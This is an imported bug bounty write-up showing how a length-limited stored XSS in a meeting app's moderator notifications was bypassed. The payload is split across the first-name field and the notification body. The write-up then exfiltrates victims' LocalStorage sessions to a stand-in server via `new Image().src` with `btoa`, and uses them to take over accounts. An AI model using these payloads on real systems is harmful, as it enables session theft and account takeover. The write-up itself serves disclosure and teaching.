---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-15_bypassing-character-limit-xss-using-spanned-payload_2.md
original_filename: 2023-03-15_bypassing-character-limit-xss-using-spanned-payload_2.md
title: Bypassing Character Limit - XSS Using Spanned Payload
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- mobile-security
language: en
raw_sha256: bd1553f7f395244e5eb47502286ae0a12ffa64649b70e3ce1ba870c53bce6380
text_sha256: 1ee2140b1238e76071b762e40689fa07faa8bbda617e78cb30a29793a86e9ccc
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Character Limit - XSS Using Spanned Payload

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-15_bypassing-character-limit-xss-using-spanned-payload_2.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, mobile-security
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `bd1553f7f395244e5eb47502286ae0a12ffa64649b70e3ce1ba870c53bce6380`
- Text SHA256: `1ee2140b1238e76071b762e40689fa07faa8bbda617e78cb30a29793a86e9ccc`


## Content

---
title: "Bypassing Character Limit - XSS Using Spanned Payload"
page_title: "Bypassing Character Limit  - XSS Using Spanned Payload | by SMHTahsin33 | InfoSec Write-ups"
url: "https://infosecwriteups.com/bypassing-character-limit-xss-using-spanned-payload-7301ffac226e"
authors: ["SMHTahsin33 (@SMHTahsin33)"]
bugs: ["XSS", "Account takeover"]
publication_date: "2023-03-15"
added_date: "2023-03-16"
source: "pentester.land/writeups.json"
original_index: 1370
scraped_via: "browseros"
---

# Bypassing Character Limit - XSS Using Spanned Payload

Top highlight

Bypassing Character Limit - XSS Using Spanned Payload
SMHTahsin33
Follow
4 min read
·
Mar 15, 2023

242

1

H
ello, I am Syed Mushfik Hasan Tahsin aka SMHTahsin33, an 18 Y/O Cyber Security Enthusiast from Bangladesh. I am into Infosec due to curiosity and I do bug bounties in free time. Working in this sector for about 3+ Years now.

Press enter or click to view image in full size

Knowing your Target (Initial Recon : Mapping Functions)

The first thing when I get started with my target, the thing I do is learning the target like what it is made for, how someone uses the web application, what functions it has… etc
The website was used for presentations or meetings online with a good looking UI. One meeting can have 1000 participants. There were 4 user roles- Moderator, Presenter, Participant & Guest. The full website was loaded dynamically on the client side with JS.

Along with all the other functions the thing that caught my eyes while comparing the user roles that, the Moderator role had an extra feature called Notifications. And I already had a few other user inputs there that could reflect in different places but didn’t have any luck with those.

Poking the Suspects

When I sent a notification there I saw that the First Name of the user was being reflected in the Notification Popup without getting filtered. When I tried to inject a payload in the First name field I observed that it was only allowing 15 characters and as <script> won’t be working there, so had no ways to exploit that. The Notification body didn’t allow any angle brackets <>

Press enter or click to view image in full size

Bypassing The Character Limit to achieve a popup!

The FNAME — Admin part is unfiltered and allows special characters and the NOTIFICATION BODY is fully filtered with an allowance of 88 characters max. When I was scrolling through this I hit up with, can’t we just use both as a one? ;)

Why not! as the FNAME allowed us special characters and also limited the input at 15 characters at the same time it wasn’t possible to use that at once, so the thing I did was injected <img src=’ on the FNAME Input which led the part from -Admin</span>…</div> to get inside that single quotation, and as it also didn’t have any single quotation in the middle it didn’t break out.

Get SMHTahsin33’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Ok, so lets come to the point about the popup? As the body of the notification was allowing single quotes and double quotes, I just started the body of the notification with a single quotation, which enclosed the contents in the middle after the FNAME inside the src attritubute of the img tag. As these tags are a non-existent source of image the value of the src is now false and caused error, here where onerror comes to play :D
I injected onerror=alert() after the single quotation in the body which made the whole thing look like this.

Press enter or click to view image in full size

Yes, the browser added the “” around the alert() by itself and also adjusted the quotations automatically on client side after injection making some modifications on it’s own leading to the popup alert.

Data Exfiltration For Account Takeover

This was using LocalStorage to store all the session information. So I needed to exfiltrate the data to my server. There were some URL Fragment or # in the session values which interrupted the data exfiltration using the GET parameter, I wasn’t able to use the encodeURIComponent() because of the character limit of the notification body. After a while searching for an alternative, ended up using btoa() to exfiltrate the Base64 Encoded version of the LocalStorage. The payload used in the body was:

‘ onerror=’new Image().src=`//127.0.0.1/?s=${btoa(JSON.stringify(localStorage))}`’

When the onerror triggered, it sent a request to my server with the LocalStorage data of the victim who was inside that meeting!

Press enter or click to view image in full size

Just decoded it and used LocalStorage Manager Extension to import these data to my browser.

Then reloaded the website and I was inside the Victims Account :)

Thanks for reading, hope you enjoyed the writeup. Don’t forget to Share 😄
